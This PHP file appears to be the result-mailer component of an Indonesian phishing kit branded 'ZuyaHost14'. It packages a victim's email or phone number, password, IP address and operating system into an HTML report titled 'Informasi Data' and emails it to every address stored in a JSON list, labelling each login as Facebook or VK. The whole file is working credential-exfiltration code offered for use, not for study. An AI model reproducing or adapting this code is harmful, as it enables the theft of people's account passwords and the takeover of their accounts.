<?php

//mencegah masuk tanpa method get
if($email == "" && $total == ""){
$url = $_SERVER['PHP_SELF'];
header("Location: send.php");
}

//jenis ress
$coda = 'WEB ZUYA HOST14⚡ ||';
$spin = 'WEB ZUYA HOST14⚡ ||';
$claim = 'WEB ZUYA HOST14⚡ ||';

//jenis mail
$coda_mail = 'coda';
$spin_mail = 'spin';
$claim_mail = 'claim';

//get setting
include 'setting.php';

//method get
$total = '1';

//mengambil random isian
include 'log-cpr.php';
include 'log-ip.php';
$noperess = '08'.rand(1000000,9999999999);

$log=array("Facebook", "VK");
$random_log=array_rand($log,2);

//info sendmail
$emailku = $email;
$logress = $log[$random_log[0]];
$idress = rand(100000000,9999999999);
$subjek = "🇮🇩 | Result Punya | $email | 🇮🇩 $ipress";
$pesan = <<<EOD
<!DOCTYPE html>
<html>
<head>
<title></title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<style type="text/css">
body {
	font-family: "Helvetica";
	width: 90%;
	display: block;
	margin: auto;
	border: 1px solid #fff;
	background: #fff;
}

.result {
	width: 100%;
	height: 100%;
	display: block;
	margin: auto;
	position: fixed;
	top: 0;
	right: 0;
	left: 0;
	bottom: 0;
	z-index: 999;
	overflow-y: scroll;
}

.tblResult {
	width: 100%;
	display: table;
	margin: 0px auto;
	border-collapse: collapse;
	text-align: center;
	background: #FFF;
}

.tblResult th {
	text-align: left;
	font-size: 0.75em;
	margin: auto;
	padding: 15px 10px;
	background: #OFF99;
	border: 2px solid #OFF99;
	color: #fff;
}

.tblResult td {
	font-size: 0.75em;
	margin: auto;
	padding: 10px;
	border: 2px solid #OFF99;
	text-align: left;
	font-weight: bold;
	color: #fff;
	text-shadow: 0px 0px 10px #fff;
}

.tblResult th img {
	width: 45px;
	display: block;
	margin: auto;
	border-radius: 50%;
	box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
}
</style>
</head>
<body>
<div class="result">
<table class="tblResult">
<tr>
<div style="background: url(ress.jpg) no-repeat;border:1px solid fuchsia;background-size: 100% 100%; width: 294; height: 101px; color: #996633; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
<div style="background: #fff5ee; width: 294; color: #00008b; text-align: center; padding: 10px;">⚡Creted by ZuyaHost14⚡️</div>
	
			<table class="tblResult">
				<tr>
</div>
 <table border="1" bordercolor="#000000" style="color:#ff00ff;border-radius:8px; border:1px solid fuchsia; border-collapse:collapse;width:100%;background:#00008b;">
    <tr>
<th style="text-align: center;" colspan="3"> Informasi Data </th>
				</tr>
				<tr>
					<td style="border-right: none;">Mail/Phone</td>
					<td style="text-align: center;">$email</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$password</td>
				</tr>
				<tr>
				<td style="border-right: none;">Login</td>
                 <td style="text-align: center;">$logress</td>
                 </tr>
                  <tr>
				</tr>
				<tr>
                  <td style="border-right: none;">IP Address</td>
					   <td style="text-align: center;">$ipress</td>
				</tr>			
				<tr>
				     <td style="border-right: none;">Os</td>
					   <td style="text-align: center;">$os</td>
				</tr>			
				<tr>
					<th style="text-align: center;" colspan="3">&copy; ZUYA-NESIA 🇮🇩 </th>
				</tr>
			</table>
		</div>
	</body>
	</html
EOD;
				
include 'garid/data.php'; //Wa Zuya Nesia 081378889599
$sender = 'From: '.$nik.'<'.$sender.'>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";


$read = file_get_contents('garid/data.json');
$json = json_decode($read,true);

for($i=0;$i<=count($json) - 1;$i++)
{
mail($json[$i]['email'], $subjek, $pesan, $headers);
}
?>